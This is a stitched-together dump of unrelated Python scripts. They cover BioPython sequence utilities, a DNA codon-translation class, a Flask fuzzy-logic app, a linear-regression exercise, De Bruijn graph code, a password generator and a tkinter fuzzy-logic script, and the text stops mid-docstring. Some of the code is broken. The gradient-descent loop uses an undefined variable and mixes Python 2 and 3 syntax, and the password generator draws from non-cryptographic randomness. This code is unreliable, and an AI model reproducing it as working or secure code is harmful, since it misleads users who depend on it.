from Bio.Seq import Seq
from Bio.SeqUtils import GC
from Bio import pairwise2



# python <dir>\assBioPython.py filter_nbases AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGNNNCA
# AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGCA
def Filter(dna):
    d = Seq(dna)
    FN = d.replace('N', '')
    return FN


# python <dir>\assBioPython.py calc_nbases AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGNNNCA
# 3
def nbases(dna):
    d = Seq(dna)
    nbases = d.count('N')
    return nbases


# python <dir>\assBioPython.py reverse_complement AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGNNNCA
def Revcomp(dna):
    d = Seq(dna)
    RC = d.reverse_complement()
    return RC


# python <dir>\assBioPython.py gc AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGNNNCA
# G count C count / len(seq) *
def gcpercentage(dna):
    z = GC(dna)
    return z


# python <dir>\assBioPython.py transcribe AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGNNNCA
def Transcribe(dna):
    d = Seq(dna)
    transcribe = d.transcribe()
    return transcribe


# python <dir>\assBioPython.py is_valid AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGCA dna
def valid(seq, typee):
    d = 'ACGT'
    rna = 'ACGU'
    protein = 'ABCDEFGHIKLMNPQRSTVWXYZabcdefghiklmnpqrstvwxyz'
    valid = True
    if typee == 'DNA' or typee == 'dna':
        for base in seq:
            if base not in d:
                valid = False
        return valid
    elif typee == 'RNA' or typee == 'rna':
        for base in seq:
            if base not in rna:
                valid = False
        return valid
    elif typee == 'PROTEIN' or typee == 'protein':
        for base in seq:
            if base not in protein:
                valid = False
        return valid
    print('The type incorrect')

# AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGCA
# AGCTGACTGACTACGTCGAGTCTA
# there is output file have the alll alignments
# python <dir>assBioPython.py seq_alignment AGCTGACTGACTACGTCGAGTCTACGTCGAGTCGTACGCA AGCTGACTGACTACGTCGAGTCTA -o output.txt
def seq_alignment(seq1, seq2, file_name=None):
    alignments = pairwise2.align.globalxx(seq1, seq2)
    if file_name == None:
        for alignment in alignments:
            print(pairwise2.format_alignment(*alignment))
    else:
        f = open(file_name, 'a')
        for alignment in alignments:
            f.write(pairwise2.format_alignment(*alignment))
        f.close()

from collections import Counter
import random


class bio_seq:
    """DNA sequnece class. Defalt value: ATCG, DNA, No label"""

    def __init__(self, seq="ATCG", seq_type="DNA", label='No Label'):
        """Sequence initialization, validation."""
        self.seq = seq.upper()
        self.label = label
        self.seq_type = seq_type
        self.is_valid = self.__validate()
        assert self.is_valid, f"Provided data does not seem to be a correct {self.seq_type} sequence"

    # DNA Toolkit functions:

    def __validate(self):
        """Check the sequence to make sure it is a valid DNA string"""
        return set(NUCLEOTIDE_BASE[self.seq_type]).issuperset(self.seq)

    def get_seq_biotype(self):
        """Returns sequence type"""
        return self.seq_type

    def get_seq_info(self):
        """Returns 4 strings. Full sequence information"""
        return f"[Label]: {self.label}\n[Sequence]: {self.seq}\n[Biotype]: {self.seq_type}\n[Length]: {len(self.seq)}"

    def generate_rnd_seq(self, length=10, seq_type="DNA"):
        """Generate a random DNA sequence, provided the length"""
        seq = ''.join([random.choice(NUCLEOTIDE_BASE[seq_type])
                       for x in range(length)])
        self.__init__(seq, seq_type, "Randomly generated sequence")

    def nucleotide_frequency(self):
        """Count nucleotides in a given sequence. Return a dictionary"""
        return dict(Counter(self.seq))

    def transcription(self):
        """DNA -> RNA Transcription. Replacing Thymine with Uracil"""
        if self.seq_type == "DNA":
            return self.seq.replace("T", "U")
        return "Not a DNA sequence"

    def reverse_complement(self):
        """
        Swapping adenine with thymine and guanine with cytosine.
        Reversing newly generated string
        """
        if self.seq_type == "DNA":
            mapping = str.maketrans('ATCG', 'TAGC')
        else:
            mapping = str.maketrans('AUCG', 'UAGC')
        return self.seq.translate(mapping)[::-1]

    def gc_content(self):
        """GC Content in a DNA/RNA sequence"""
        return round((self.seq.count('C') + self.seq.count('G')) / len(self.seq) * 100)

    def gc_content_subsec(self, k=20):
        """GC Content in a DNA/RNA sub-sequence length k. k=20 by default"""
        res = []
        for i in range(0, len(self.seq) - k + 1, k):
            subseq = self.seq[i:i + k]
            res.append(
                round((subseq.count('C') + subseq.count('G')) / len(subseq) * 100))
        return res

    def translate_seq(self, init_pos=0):
        """Translates a DNA sequence into an aminoacid sequence"""
        if self.seq_type == "DNA":
            return [DNA_Codons[self.seq[pos:pos + 3]] for pos in range(init_pos, len(self.seq) - 2, 3)]
        elif self.seq_type == "RNA":
            return [RNA_Codons[self.seq[pos:pos + 3]] for pos in range(init_pos, len(self.seq) - 2, 3)]

    def codon_usage(self, aminoacid):
        """Provides the frequency of each codon encoding a given aminoacid in a DNA sequence"""
        tmpList = []
        if self.seq_type == "DNA":
            for i in range(0, len(self.seq) - 2, 3):
                if DNA_Codons[self.seq[i:i + 3]] == aminoacid:
                    tmpList.append(self.seq[i:i + 3])

        elif self.seq_type == "RNA":
            for i in range(0, len(self.seq) - 2, 3):
                if RNA_Codons[self.seq[i:i + 3]] == aminoacid:
                    tmpList.append(self.seq[i:i + 3])

        freqDict = dict(Counter(tmpList))
        totalWight = sum(freqDict.values())
        for seq in freqDict:
            freqDict[seq] = round(freqDict[seq] / totalWight, 2)
        return freqDict

    def gen_reading_frames(self):
        """Generate the six reading frames of a DNA sequence, including reverse complement"""
        frames = []
        frames.append(self.translate_seq(0))
        frames.append(self.translate_seq(1))
        frames.append(self.translate_seq(2))
        tmp_seq = bio_seq(self.reverse_complement(), self.seq_type)
        frames.append(tmp_seq.translate_seq(0))
        frames.append(tmp_seq.translate_seq(1))
        frames.append(tmp_seq.translate_seq(2))
        del tmp_seq
        return frames

    def proteins_from_rf(self, aa_seq):
        """Compute all possible proteins in an aminoacid seq and return a list of possible proteins"""
        current_prot = []
        proteins = []
        for aa in aa_seq:
            if aa == "_":
                # STOP accumulating amino acids if _ - STOP was found
                if current_prot:
                    for p in current_prot:
                        proteins.append(p)
                    current_prot = []
            else:
                # START accumulating amino acids if M - START was found
                if aa == "M":
                    current_prot.append("")
                for i in range(len(current_prot)):
                    current_prot[i] += aa
        return proteins

    def all_proteins_from_orfs(self, startReadPos=0, endReadPos=0, ordered=False):
        """Compute all possible proteins for all open reading frames"""
        """Protine Search DB: https://www.ncbi.nlm.nih.gov/nuccore/NM_001185097.2"""
        """API can be used to pull protein info"""
        if endReadPos > startReadPos:
            tmp_seq = bio_seq(
                self.seq[startReadPos: endReadPos], self.seq_type)
            rfs = tmp_seq.gen_reading_frames()
        else:
            rfs = self.gen_reading_frames()

        res = []
        for rf in rfs:
            prots = self.proteins_from_rf(rf)
            for p in prots:
                res.append(p)

        if ordered:
            return sorted(res, key=len, reverse=True)
        return res


NUCLEOTIDE_BASE = {
    "DNA": ["A", "T", "C", "G"],
    "RNA": ["A", "U", "C", "G"]
}

DNA_Codons = {
    # 'M' - START, '_' - STOP
    "GCT": "A", "GCC": "A", "GCA": "A", "GCG": "A",
    "TGT": "C", "TGC": "C",
    "GAT": "D", "GAC": "D",
    "GAA": "E", "GAG": "E",
    "TTT": "F", "TTC": "F",
    "GGT": "G", "GGC": "G", "GGA": "G", "GGG": "G",
    "CAT": "H", "CAC": "H",
    "ATA": "I", "ATT": "I", "ATC": "I",
    "AAA": "K", "AAG": "K",
    "TTA": "L", "TTG": "L", "CTT": "L", "CTC": "L", "CTA": "L", "CTG": "L",
    "ATG": "M",
    "AAT": "N", "AAC": "N",
    "CCT": "P", "CCC": "P", "CCA": "P", "CCG": "P",
    "CAA": "Q", "CAG": "Q",
    "CGT": "R", "CGC": "R", "CGA": "R", "CGG": "R", "AGA": "R", "AGG": "R",
    "TCT": "S", "TCC": "S", "TCA": "S", "TCG": "S", "AGT": "S", "AGC": "S",
    "ACT": "T", "ACC": "T", "ACA": "T", "ACG": "T",
    "GTT": "V", "GTC": "V", "GTA": "V", "GTG": "V",
    "TGG": "W",
    "TAT": "Y", "TAC": "Y",
    "TAA": "_", "TAG": "_", "TGA": "_"
}

RNA_Codons = {
    # 'M' - START, '_' - STOP
    "GCU": "A", "GCC": "A", "GCA": "A", "GCG": "A",
    "UGU": "C", "UGC": "C",
    "GAU": "D", "GAC": "D",
    "GAA": "E", "GAG": "E",
    "UUU": "F", "UUC": "F",
    "GGU": "G", "GGC": "G", "GGA": "G", "GGG": "G",
    "CAU": "H", "CAC": "H",
    "AUA": "I", "AUU": "I", "AUC": "I",
    "AAA": "K", "AAG": "K",
    "UUA": "L", "UUG": "L", "CUU": "L", "CUC": "L", "CUA": "L", "CUG": "L",
    "AUG": "M",
    "AAU": "N", "AAC": "N",
    "CCU": "P", "CCC": "P", "CCA": "P", "CCG": "P",
    "CAA": "Q", "CAG": "Q",
    "CGU": "R", "CGC": "R", "CGA": "R", "CGG": "R", "AGA": "R", "AGG": "R",
    "UCU": "S", "UCC": "S", "UCA": "S", "UCG": "S", "AGU": "S", "AGC": "S",
    "ACU": "T", "ACC": "T", "ACA": "T", "ACG": "T",
    "GUU": "V", "GUC": "V", "GUA": "V", "GUG": "V",
    "UGG": "W",
    "UAU": "Y", "UAC": "Y",
    "UAA": "_", "UAG": "_", "UGA": "_"
}


def colored(seq):
    bcolors = {
        'A': '\033[92m',
        'C': '\033[94m',
        'G': '\033[93m',
        'T': '\033[91m',
        'U': '\033[91m',
        'reset': '\033[0;0m'
    }

    tmpStr = ""

    for nuc in seq:
        if nuc in bcolors:
            tmpStr += bcolors[nuc] + nuc
        else:
            tmpStr += bcolors['reset'] + nuc

    return tmpStr + '\033[0;0m'


def readTextFile(filePath):
    with open(filePath, 'r') as f:
        return "".join([l.strip() for l in f.readlines()])


def writeTextFile(filePath, seq, mode='w'):
    with open(filePath, mode) as f:
        f.write(seq + '\n')


def read_FASTA(filePath):
    with open(filePath, 'r') as f:
        FASTAFile = [l.strip() for l in f.readlines()]

    FASTADict = {}
    FASTALabel = ""

    for line in FASTAFile:
        if '>' in line:
            FASTALabel = line
            FASTADict[FASTALabel] = ""
        else:
            FASTADict[FASTALabel] += line

    return FASTADict


from filesImport import *

class bioFun:
    #init
    def __init__(self,dna):
        self.dna=dna.upper()
    #GC Percentage
    def gcContent(self):
        return gcpercentage(self.dna)
    # Transcribation
    def Transcribe(self):
        d = Seq(self.dna)
        transcribe = d.transcribe()
        return transcribe
    # Reverse_complement
    def Revcomp(self):
        return Revcomp(self.dna)
    # count n bases
    def count_nbases(self):
        return nbases(self.dna)
    # Filter n bases
    def Filter(self):
        return Filter(self.dna)
    # validation
    def validation(self,typee):
        return valid(self.dna,typee)
    # seq alignments
    def seqalignments(slef,seq1,seq2,path=None):
        return seq_alignment(seq1,seq2,path)


    # file alignment
    # def alignment_files(slef,path1,path2,out):
    #     seq_alignment_files(path1,path2,out)
    # # online alignment
    # def online(slef,seq,path):
    #     online_alignment(seq,path)
    # # convert
    # def conv(slef,path):
    #     convert(path)
    # # mergation
    # def mergation(slef,path,*paths):
    #     merge(path,paths)


    import getopt
import sys


def fillingOptsArgs():
    try:
        opts, args = getopt.gnu_getopt(sys.argv[1:], 'o:h:')
    except getopt.GetoptError as err:
        print(err)
        opts = []
    return opts, args


def runArgs(mybio, args, opts):
    for i in args:
        if i == 'gc':
            print(f'GC: {mybio.gcContent()}')
        elif i == 'transcribe':  # transcribe
            print(f'Transcribe: {mybio.Transcribe()}')
        elif i == 'reverse_complement':  # reverse_complement
            print(f'reverse_complement: {mybio.Revcomp()}')
        elif i == 'calc_nbases':  # calc_nbases
            print(f'calculate n bases: {mybio.count_nbases()}')
        elif i == 'filter_nbases':  # filter_nbases
            print(f'Filter n bases: {mybio.Filter()}')
        elif i == 'is_valid':  # is_valid
            print(f'is_valid_Done: {mybio.validation(args[2])}')
        else:
            print('wrong entry')
        break
    for opt, i in opts:
        if opt in ['-o', '-h']:
            if args[0] == 'seq_alignment':  # seq_alignment
                if i != None:
                    print(f'seq_alignment_Done: {mybio.seqalignments(args[1], args[2],i)}')
                else:
                    print(f'seq_alignment_Done: {mybio.seqalignments(args[1], args[2])}')
                    print('option should be like "output.txt"')
        else:
            assert False, "unhandled option"
from typing import List, TextIO
from flask import Flask, render_template, request, send_file
import matplotlib.pyplot as plt


def remove_space(rules):
    while '' in rules:
        rules.remove('')

    return rules


class FSet:
    def __init__(self, name: str, type_: str, x_coord: List[int], membership=None, centroid=None):
        self.name = name
        self.type = type_
        self.points = [(x, 1.0 if i == 1 or (i == 2 and type_ == 'TRAP') else 0.0) for i, x in enumerate(x_coord)]
        self.membership = membership
        self.centroid = centroid

    def calcCentroid(self) -> None:
        self.centroid = sum(map(lambda p: p[0], self.points)) / len(self.points)

        pass

    def calcSetMembership(self, crisp_value) -> float:
        points_number = 3 if self.type == 'TRI' else 4

        if crisp_value < self.points[0][0] or crisp_value > self.points[points_number - 1][0]:
            return 0

        for point_I in range(points_number):
            if crisp_value == self.points[point_I][0]:
                membership = self.points[point_I][1]
                return membership

            elif point_I < points_number - 1 and self.points[point_I][0] < crisp_value < self.points[point_I + 1][0]:
                m = (self.points[point_I + 1][1] - self.points[point_I][1]) / (
                        self.points[point_I + 1][0] - self.points[point_I][0])
                c = self.points[point_I][1] - m * self.points[point_I][0]
                membership = round(m * crisp_value + c, 2)
                return membership

        pass

    def setMembership(self, new_value):
        if self.membership is None or self.membership < new_value:
            self.membership = new_value

        pass


class Variable:
    def __init__(self, name: str, f_range: List[int], f_sets=None, crisp_value=None):
        if f_sets is None:
            f_sets = []
        self.name = name
        self.f_range = f_range
        self.f_sets = f_sets
        self.crisp_value = crisp_value

    def addSets(self, fuzzy_sets: list[FSet]):
        for f_set in fuzzy_sets:
            for point in f_set.points:
                if point[0] > self.f_range[1] or point[0] < self.f_range[0]:
                    raise BaseException(f'{f_set.name} Set of {self.name} var have invalid range.')
        self.f_sets.extend(fuzzy_sets)

        pass

    def calcWeightedMeans(self):
        self.crisp_value = sum(map(lambda f_set: f_set.membership * f_set.centroid, self.f_sets)) / sum(
            map(lambda f_set: f_set.membership, self.f_sets))

        pass

    def getBestSet(self):
        maxMembership = -1
        bestSet = None
        for f_set in self.f_sets:
            currentMembership = f_set.calcSetMembership(self.crisp_value)
            if currentMembership >= maxMembership:
                maxMembership = currentMembership
                bestSet = f_set

        return bestSet


class FuzzyLogic:
    def __init__(self, in_vars: List[Variable], out_vars: List[Variable], rules: List[str]) -> None:
        self.in_vars = in_vars
        self.out_vars = out_vars
        self.rules = rules

        pass

    @staticmethod
    def setUpFuzzyLogic(input_file: TextIO):
        # get var number
        in_vars = []
        out_var = []
        var_number = int(input_file.readline())
        # parse variables
        for _ in range(var_number):
            var_params_list = input_file.readline().rstrip('\n').split(' ')
            var_name = var_params_list[0]
            var_type = var_params_list[1]
            var_range_str = var_params_list[2].removeprefix('[').removesuffix(']').split(',')
            var_range = list(map(int, var_range_str))
            var_crisp_value = int(var_params_list[3]) if len(var_params_list) == 4 else None

            # parse variables sets
            sets = []
            sets_number = int(input_file.readline())
            for __ in range(sets_number):
                set_params_list = input_file.readline().split(' ')
                set_name = set_params_list[0]
                set_type = set_params_list[1]
                set_X = list(map(int, set_params_list[2:]))
                sets.append(FSet(set_name, set_type, set_X))

            var = Variable(var_name, var_range, sets, var_crisp_value)
            if var_type == 'IN':
                in_vars.append(var)
            elif var_type == 'OUT':
                out_var.append(var)
            else:
                raise BaseException("Wrong var type")

            input_file.readline()  # skip line break

        # parse rules
        rules_number = int(input_file.readline())
        rules = [input_file.readline() for _ in range(rules_number)]

        return FuzzyLogic(in_vars, out_var, rules)

    def map_var_sets_names(self, is_for_input: bool):
        sets_names = {}

        for var in self.in_vars if is_for_input else self.out_vars:
            for f_set in var.f_sets:
                name = var.name + ' ' + f_set.name
                sets_names[name] = f_set

        return sets_names

    def fuzzification(self):
        for var in self.in_vars:
            for f_set in var.f_sets:
                f_set.membership = f_set.calcSetMembership(var.crisp_value)

        pass

    def inference(self):
        names_map_in = self.map_var_sets_names(True)
        names_map_out = self.map_var_sets_names(False)
        for rule in self.rules:
            self.parseAndApplyRule(rule, names_map_in, names_map_out)

        pass

    def defuzzification(self):
        for var in self.out_vars:
            for f_set in var.f_sets:
                f_set.calcCentroid()
            var.calcWeightedMeans()

        pass

    @staticmethod
    def parseAndApplyRule(rule_str: str, names_map_in: dict, names_map_out: dict) -> None:
        rules = rule_str.split()
        for rule_index in range(len(rules)):
            try:
                rule_name = rules[rule_index] + ' ' + rules[rule_index + 1]
                if rule_name in names_map_in:
                    rules[rule_index] = str(names_map_in[rule_name].membership)
                    rules[rule_index + 1] = ''
            except IndexError:
                break

        rules = remove_space(rules)

        for rule_index in range(len(rules)):
            if rules[rule_index] == 'not':
                not_ = 1 - float(rules[rule_index + 1])
                rules[rule_index] = str(not_)
                rules[rule_index + 1] = ''

        rules = remove_space(rules)

        for rule_index in range(len(rules)):
            if rules[rule_index] == 'and':
                and_ = min(float(rules[rule_index - 1]), float(rules[rule_index + 1]))
                rules[rule_index + 1] = str(and_)
                rules[rule_index - 1] = ''
                rules[rule_index] = ''

        rules = remove_space(rules)

        for rule_index in range(len(rules)):
            if rules[rule_index] == 'or':
                or_ = max(float(rules[rule_index - 1]), float(rules[rule_index + 1]))
                rules[rule_index + 1] = str(or_)
                rules[rule_index - 1] = ''
                rules[rule_index] = ''

        rules = remove_space(rules)
        rules.remove("=>")
        membership = float(rules[0])
        out_set_name = ' '.join(rules[1:])
        names_map_out[out_set_name].setMembership(membership)

        pass

    @staticmethod
    def runFuzzy(in_file_path, out_file_path):
        file = open(in_file_path)
        fl = FuzzyLogic.setUpFuzzyLogic(file)
        fl.fuzzification()
        fl.inference()
        fl.defuzzification()

        file = open(out_file_path, 'w')
        for output_var in fl.out_vars:
            file.write(f'{output_var.name}: {output_var.getBestSet().name} {round(output_var.crisp_value, 2)}\n')

        return fl

    def plotting(self):
        vars_in_out = []
        vars_in_out.extend(self.in_vars)
        vars_in_out.extend(self.out_vars)
        figure, axs = plt.subplots(len(vars_in_out), 1, figsize=(8, 10))
        figure.subplots_adjust(hspace=1.5, wspace=1)
        for var_i in range(len(vars_in_out) - len(self.in_vars)):
            for f_set in vars_in_out[var_i].f_sets:
                axs[var_i].plot(list(map(lambda x: x[0], f_set.points)), list(map(lambda x: x[1], f_set.points)),
                                label=f_set.name)
                axs[var_i].set_title(vars_in_out[var_i].name)
            axs[var_i].legend(list(map(lambda x: x.name, vars_in_out[var_i].f_sets)))

        for var_i in range(len(self.in_vars), len(vars_in_out)):
            for f_set in vars_in_out[var_i].f_sets:
                axs[var_i].plot(list(map(lambda x: x[0], f_set.points)), list(map(lambda x: x[1], f_set.points)),
                                label=f_set.name)
                axs[var_i].set_title(vars_in_out[var_i].name, color='red')
            axs[var_i].legend(list(map(lambda x: x.name, vars_in_out[var_i].f_sets)))

        plt.show()


app = Flask(__name__)


@app.route("/")
def hello_world():
    return render_template('UI.html')


@app.route('/runFyzzy', methods=['PUT', 'POST'])
def runFuzzy():
    file = request.files['input_file']
    file.save('temp/input.txt')
    fl = FuzzyLogic.runFuzzy('temp/input.txt', 'temp/output.txt')
    fl.plotting()
    return send_file('temp/output.txt', as_attachment=True)


import pandas
import matplotlib.pyplot as plt
from pandas.tools.plotting import scatter_matrix
import numpy as np




def computeCost(X, y, theta):
	"""
	   computes the cost of using theta as the parameter for linear
	   regression to fit the data points in X and y
	"""

	m = y.size
	J = 0

	h = np.dot(X,theta)
	sq_error = np.sum(np.square(h - y))
	J =  (sq_error) / (2 * m)
# =========================================================================

	return J

def gradient_descent(X, y, theta, alpha, num_iters):
	'''
	Performs gradient descent to learn theta
	by taking num_items gradient steps with learning
	rate alpha and update theata0, theata1
	'''
	for i in num :
		h=theta[0]+theta[1]*X
		r=y.size()
		j=((1/r))*((h-y)**2)
		d0=j
		d1=j*X
		theta[0]=theta[0]-alpha*d0
		theta[1] = theta[1] - alpha * d1
	return theta


#Load the dataset
data = pandas.read_csv('data.csv')

scatter_matrix(data[['population','profit']])
plt.show()

X = data['population']
y = data['profit']

#number of training samples
m = y.size
#X = np.vstack(zip(np.ones(m),data['population']))

#Initialize theta parameters
theta0 = 0
theta1 =0
#Some gradient descent settings
iterations = 1500
alpha = 0.01
#compute and display initial cost
theta = gradient_descent(X, y, [theta0,theta1], alpha, iterations) #To be completed by students
print "theta",theta

#Predict values for population sizes of 3.5 and 7.0
#Students write prediction code

h = np.dot([1,3.5], theta)
print(h)

from collections import defaultdict

def DeBruijnGraph(reads,k):
    # Initialize an empty defaultdict to store the graph
    graph = defaultdict(list)
    # Iterate through each read in the input list
    for read in reads:
        # Generate the k-mers for the read
        kmers = [read[i:i + k] for i in range(len(read) - k + 1)]
        # Add edges between adjacent k-mers
        for i in range(len(kmers) - 1):
            graph[kmers[i]].append(kmers[i + 1])

    for i in graph:
        print(i + " -> " + ",".join(graph[i]))
    return graph

def kmers(sequence, k):
    """
    Returns a list of all k-mers in the given DNA sequence.
    """
    # Initialize an empty list to store k-mers
    kmer_list = []
    # Iterate through the sequence, generating k-mers of length k
    for i in range(len(sequence) - k + 1):
        kmer = sequence[i:i+k]
        kmer_list.append(kmer)
    return kmer_list


sequence = "ATCGATCGATCG"
k = int(input("enter the k of the kmer : "))
kmer_list = kmers(sequence, k)
print(kmer_list)
print('================================================================================================================')


reads = ['ATGG', 'TGCC', 'TAAT', 'CCAT', 'GGG', 'GGATG', 'ATGTT']
k = int(input("enter the k of the De Bruijn Graph : "))
graph = DeBruijnGraph(reads, k)
print(graph)

import random
import array
 
# maximum length of password needed
# this can be changed to suit your password length
MAX_LEN = 12
 
# declare arrays of the character that we need in out password
# Represented as chars to enable easy string concatenation
DIGITS = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'] 
LOCASE_CHARACTERS = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',
                     'i', 'j', 'k', 'm', 'n', 'o', 'p', 'q',
                     'r', 's', 't', 'u', 'v', 'w', 'x', 'y',
                     'z']
 
UPCASE_CHARACTERS = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                     'I', 'J', 'K', 'M', 'N', 'O', 'P', 'Q',
                     'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y',
                     'Z']
 
SYMBOLS = ['@', '#', '$', '%', '=', ':', '?', '.', '/', '|', '~', '>',
           '*', '(', ')', '<']
 
# combines all the character arrays above to form one array
COMBINED_LIST = DIGITS + UPCASE_CHARACTERS + LOCASE_CHARACTERS + SYMBOLS
 
# randomly select at least one character from each character set above
rand_digit = random.choice(DIGITS)
rand_upper = random.choice(UPCASE_CHARACTERS)
rand_lower = random.choice(LOCASE_CHARACTERS)
rand_symbol = random.choice(SYMBOLS)
 
# combine the character randomly selected above
# at this stage, the password contains only 4 characters but
# we want a 12-character password
temp_pass = rand_digit + rand_upper + rand_lower + rand_symbol
 
 
# now that we are sure we have at least one character from each
# set of characters, we fill the rest of
# the password length by selecting randomly from the combined
# list of character above.
for x in range(MAX_LEN - 4):
    temp_pass = temp_pass + random.choice(COMBINED_LIST)
 
    # convert temporary password into array and shuffle to
    # prevent it from having a consistent pattern
    # where the beginning of the password is predictable
    temp_pass_list = array.array('u', temp_pass)
    random.shuffle(temp_pass_list)
 
# traverse the temporary password array and append the chars
# to form the password
password = ""
for x in temp_pass_list:
        password = password + x
         
# print out password
print(password)

from collections import defaultdict


def kmers(seq, k):
    return [seq[i:i + k] for i in range(len(seq) - k + 1)]


def DeBruijnGraph(reads, k):
    dicti = {}
    E = []
    for read in reads:
        KMers = kmers(read, k)
        edges = [kmers(mer, k - 1) for mer in KMers]
        for edge in edges:
            if edge[0] not in dicti.keys():
                dicti[edge[0]] = []
            if edge[1] not in dicti.keys():
                dicti[edge[1]] = []
            dicti[edge[0]].append(edge[1])
            E.append(edge)
    V = list(dicti.keys())
    graph = {'nodes': V, 'edges': E}
    # print(graph)
    return (graph, dicti)


def build_degrees(graph, _in):
    assert _in == 1 or _in == 0, "_in must be 0 or 1"
    degrees = {}
    for node in graph['nodes']:
        degrees[node] = 0

    for node in graph['nodes']:
        for edge in graph['edges']:
            if node == edge[_in]:
                degrees[node] += 1
    return degrees


k = None


def mergeChains(graph):
    _in = build_degrees(graph, _in=1)
    out = build_degrees(graph, _in=0)
    canMerge = True

    while canMerge:
        canMerge = False
        for edge in graph['edges']:
            A = edge[0]
            B = edge[1]
            if out[A] == _in[B] == 1:
                canMerge = True
                # Merge
                graph['edges'].remove(edge)
                graph['nodes'].remove(A)
                graph['nodes'].remove(B)
                newNode = A + B[k-1:]
                graph['nodes'].append(newNode)
                for e in graph['edges']:
                    if e[0] == B:
                        e[0] = newNode
                    if e[1] == A:
                        e[1] = newNode

                _in[newNode] = _in[A]
                out[newNode] = out[B]
                _in.pop(A)
                _in.pop(B)
                out.pop(A)
                out.pop(B)

    return graph


def main():
    global k
    k = 4
    graph, debrujin = DeBruijnGraph(
        ['TTACGTT', 'CCGTTA', 'GTTAC', 'GTTCGA', 'CGTTC'], 5)

    print(graph)

    newGraph = mergeChains(graph)

    print(newGraph)


main()

import tkinter
from tkinter import *
from tkinter import ttk, filedialog

# Create an instance of tkinter frame
win = Tk()
# Set the geometry of tkinter frame
win.geometry("700x350")


def run():
    # Add a Label widget
    label = Label(win, text="Click the Button to browse the Files", font=('Georgia 13'))
    label.pack(pady=10)
    b = StringVar()

    # Create a Button
    z = ttk.Button(win, text="Browse", command=open_file).pack(pady=20)

    win.mainloop()

fileName=''
def open_file(event=None):
    global fileName
    fileName = filedialog.askopenfile(filetypes=[('TEXT Files', '*.txt')])
    win.quit()


# ============================= Classes =============================
class Set:
    def __init__(self, name, typ, xs):
        self.name = name
        self.type = typ
        self.xs = xs
        self.ms = None


class Variable:
    def __init__(self, name: str, sets=[], value=None):
        self.name = name
        self.sets = sets
        self.value = value
        self.bestSet = None


# ============================= Read File =============================



run()
inputFile = fileName

inVars = []
inVarsNumber = int(inputFile.readline())
for i in range(inVarsNumber):
    var = inputFile.readline().split(' ')
    varName = var[0]
    value = int(var[1])
    var = Variable(varName, [], value)
    inVars.append(var)

outVars = []
outVarsNumber = int(inputFile.readline())
for i in range(outVarsNumber):
    varName = inputFile.readline().strip('\n')
    var = Variable(varName, [], None)
    outVars.append(var)


for i in range(inVarsNumber):
    sets = []
    for j in range(int(inputFile.readline())):
        set = inputFile.readline().split(' ')
        setName = set[0]
        setType = set[1]
        setXs = []
        for x in set[2:]:
            setXs.append(int(x))
        set = Set(setName, setType, setXs)
        sets.append(set)
    inVars[i].sets=sets

for i in range(outVarsNumber):
    sets = []
    for j in range(int(inputFile.readline())):
        set = inputFile.readline().split(' ')
        setName = set[0]
        setType = set[1]
        setXs = []
        for x in set[2:]:
            setXs.append(int(x))
        set = Set(setName, setType, setXs)
        sets.append(set)
    outVars[i].sets=sets

rulesNumber = int(inputFile.readline())
rules = []
for i in range(rulesNumber):
    rules.append(inputFile.readline().strip('\n'))


# ============================= Fuzzification =============================
for var in inVars:
    for set in var.sets:
        if var.value < set.xs[0]:
            set.ms = 0
        elif var.value > set.xs[len(set.xs) - 1]:
            set.ms = 0
        else:
            for i in range(len(set.xs)):
                if var.value == set.xs[i]:
                    set.ms = 0 if i == 0 or i == len(set.xs)-1 else 1

                elif i < len(set.xs) - 1 and set.xs[i] < var.value and var.value < set.xs[i + 1]:
                    y1 = 0 if i == 0 or i == len(set.xs)-1 else 1
                    y2 = 0 if i+1 == 0 or i+1 == len(set.xs)-1 else 1
                    x1 = set.xs[i]
                    x2 = set.xs[i+1]

                    m = (y2 - y1) / (x2 - x1)
                    c = y1 - m * x1
                    set.ms = m * var.value + c


# ============================= Inference =============================
def searName(vars, name):
    for var in vars:
        if name == var.name:
            return var
    return False

def Operator(strings):
    newArr=[]
    for i in range(len(strings)):
        try:
            if strings[i] == 'not':
                x = 1 - float(strings[i + 1])
                strings[i + 1] = x
                strings.remove(strings[i])
                newArr.append(strings[i])
            else:
                newArr.append(strings[i])
        except (IndexError):
            break
    strings=newArr
    for i in range(len(strings)):
        try:
            if strings[i]=='and':
                x=float(strings[i-1])
                y=float(strings[i+1])
                z=min(x,y)
                strings[i]=z
                strings.remove(strings[i+1])
                strings.remove(strings[i-1])
            else:
               newArr=strings
        except(IndexError):
            break
    strings=newArr
    for i in range(len(strings)):
        try:
            if strings[i]=='or':
                x=float(strings[i-1])
                y=float(strings[i+1])
                z=max(x,y)
                strings[i]=z
                strings.remove(strings[i+1])
                strings.remove(strings[i-1])
            else:
               newArr=strings
        except(IndexError):
            break
    return newArr[0]

for rule in rules:
    rule = rule.lower()
    operation, output = rule.split(' => ')
    operation = operation.split(' ')
    newOperation = []
    skip = False
    for i in range(len(operation)):
        if skip:
            skip = False
            continue

        var = searName(inVars, operation[i])
        if var:
            set = searName(var.sets, operation[i+1])
            newOperation.append(str(set.ms))
            skip = True
        else:
            newOperation.append(operation[i])
    var = searName(outVars, output.split(' ')[0])
    set = searName(var.sets, output.split(' ')[1])
    newMs = Operator(newOperation)
    if not set.ms or newMs > set.ms: 
        set.ms = newMs


# ============================= Defuzzification =============================
for var in outVars:
    msXcenterSum = 0
    msSum = 0
    bestMS = 0
    bestSet = var.sets[0].name
    for set in var.sets:
        center = sum(set.xs)/len(set.xs)
        msXcenterSum += set.ms*center
        msSum += set.ms

        if set.ms > bestMS:
            bestMS = set.ms
            bestSet = set.name
    var.value = msXcenterSum / msSum
    var.bestSet = bestSet




# ============================= Output File =============================
file = open('o.txt', 'w')
for outVar in outVars:
    file.write(outVar.name)
    file.write(' -> ')
    file.write(outVar.bestSet)
    file.write(' (')
    file.write(str(outVar.value))
    file.write(')\n')
file.close()
print('Done. wrote to out.txt')



# input file structure
"""
2
